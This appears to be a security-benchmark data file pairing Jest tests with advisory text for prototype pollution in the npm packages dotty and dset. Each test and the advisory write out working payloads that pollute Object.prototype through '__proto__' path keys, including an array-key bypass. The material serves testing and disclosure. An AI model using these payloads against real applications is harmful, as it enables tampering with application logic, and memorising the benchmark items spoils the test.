secbench_test:
//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
test("prototype pollution in dotty", () => {
  expect({}.polluted).toBe(undefined);

  const dotty = require("dotty");
  dotty.put({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});

advisory_descriptions:
dottyis a package that can access properties of nested objects using dot-path notation.Affected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2021-25912 when the user-provided keys used in thepathparameter are arrays.const dotty = require('dotty');// dotty.put({}, ['proto','polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defineddotty.put({}, [['proto'],'polluted'], 'yes');
console.log(polluted); // yes

secbench_test:
//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28277
test("prototype pollution in dset", () => {
  expect({}.polluted).toBe(undefined);

  const dset = require("dset");
  dset({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});

